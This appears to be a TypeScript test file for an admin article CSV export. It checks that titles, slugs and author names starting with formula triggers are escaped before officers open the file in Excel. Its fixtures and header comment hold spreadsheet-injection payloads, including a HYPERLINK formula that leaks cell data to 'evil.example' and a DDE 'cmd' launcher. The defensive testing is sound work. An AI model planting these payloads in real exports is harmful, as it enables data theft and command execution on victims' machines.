import assert from 'node:assert/strict'
import test, { mock } from 'node:test'
import { sql } from 'drizzle-orm'

/**
 * GET /api/admin/articles/export-csv writes titles, slugs and author names —
 * text people type — into a CSV that officers open in Excel. A title starting
 * with `=`, `+`, `-` or `@` (or a tab/CR before one) is run as a formula there
 * (`=HYPERLINK("https://evil/?"&A2,"Bấm")`, DDE `=cmd|…`). Runs the real handler
 * with a fake database and parses what it would download.
 */

let rows: Array<Record<string, unknown>> = []
const chain = {
  from: () => chain,
  leftJoin: () => chain,
  where: () => chain,
  orderBy: () => chain,
  limit: async () => rows,
}
mock.module('../server/utils/db', { namedExports: { getDb: () => ({ select: () => chain }) } })
mock.module('../server/services/articles', { namedExports: { articleReadScope: () => sql`1 = 1` } })

type Event = { query: Record<string, string>, headers: Record<string, unknown>, context: Record<string, unknown> }
const globals = globalThis as unknown as Record<string, unknown>
globals.defineEventHandler = (handler: unknown) => handler
globals.getQuery = (event: Event) => event.query
globals.setHeader = (event: Event, name: string, value: unknown) => { event.headers[name] = value }
globals.createError = (input: { statusCode: number, statusMessage: string }) => Object.assign(new Error(input.statusMessage), input)

const handler = (await import('../server/api/admin/articles/export-csv.get')).default as unknown as (event: Event) => Promise<string>
const { csvCell, neutralizeSpreadsheetText } = await import('../server/utils/spreadsheet-cell')

function row(id: number, title: string, overrides: Record<string, unknown> = {}) {
  return { id, type: 'news', title, slug: `bai-${id}`, status: 'published', categoryName: 'Tin', authorName: 'bientap', viewTotal: 12, publishedAt: new Date('2026-10-01T03:00:00Z'), createdAt: new Date('2026-09-30T03:00:00Z'), ...overrides }
}

/** Minimal RFC 4180 reader — enough to get each cell back as Excel would see it. */
function parseCsv(text: string): string[][] {
  const out: string[][] = []
  let rowCells: string[] = []
  let cell = ''
  let quoted = false
  for (let i = 0; i < text.length; i++) {
    const ch = text[i]!
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') { cell += '"'; i++ }
      else if (ch === '"') quoted = false
      else cell += ch
    } else if (ch === '"') quoted = true
    else if (ch === ',') { rowCells.push(cell); cell = '' }
    else if (ch === '\r' && text[i + 1] === '\n') { rowCells.push(cell); out.push(rowCells); rowCells = []; cell = ''; i++ }
    else cell += ch
  }
  rowCells.push(cell)
  out.push(rowCells)
  return out
}

const FORMULA_START = /^[=+\-@\t\r]/

test('no downloaded cell starts with a formula trigger; the text itself is kept', async () => {
  rows = [
    row(1, '=HYPERLINK("https://evil.example/?"&A1,"Bấm")'),
    row(2, '+cmd|\' /C calc\'!A0'),
    row(3, '-2+3', { slug: '@SUM(1+1)' }),
    row(4, '\t=1+1', { authorName: '=evil' }),
    row(5, 'Tiêu đề, có dấu phẩy và "ngoặc kép"'),
    row(6, 'Bình thường'),
  ]
  const event: Event = { query: {}, headers: {}, context: { adminUser: { id: 1 } } }
  const csv = await handler(event)
  assert.match(String(event.headers['Content-Type']), /text\/csv/)
  assert.equal(csv.charCodeAt(0), 0xFEFF, 'the UTF-8 BOM is still first')
  const table = parseCsv(csv.slice(1))
  for (const cells of table.slice(1)) {
    for (const cell of cells) assert.ok(!FORMULA_START.test(cell), `live formula cell: ${JSON.stringify(cell)}`)
  }
  const byId = new Map(table.slice(1).map(cells => [cells[0], cells]))
  assert.equal(byId.get('1')![1], `'=HYPERLINK("https://evil.example/?"&A1,"Bấm")`)
  assert.equal(byId.get('3')![2], `'@SUM(1+1)`)
  assert.equal(byId.get('4')![6], `'=evil`)
  assert.equal(byId.get('5')![1], 'Tiêu đề, có dấu phẩy và "ngoặc kép"', 'quoting still round-trips')
  assert.equal(byId.get('6')![1], 'Bình thường', 'ordinary text is untouched')
  assert.equal(byId.get('6')![8], '2026-09-30')
})

test('csvCell / neutralizeSpreadsheetText', () => {
  assert.equal(csvCell(-5), '-5', 'a number is data, not a formula')
  assert.equal(csvCell('-5'), `'-5`)
  assert.equal(csvCell('\r=1'), `"'\r=1"`)
  assert.equal(csvCell(null), '')
  assert.equal(neutralizeSpreadsheetText('a=b'), 'a=b', 'only a LEADING trigger matters')
})
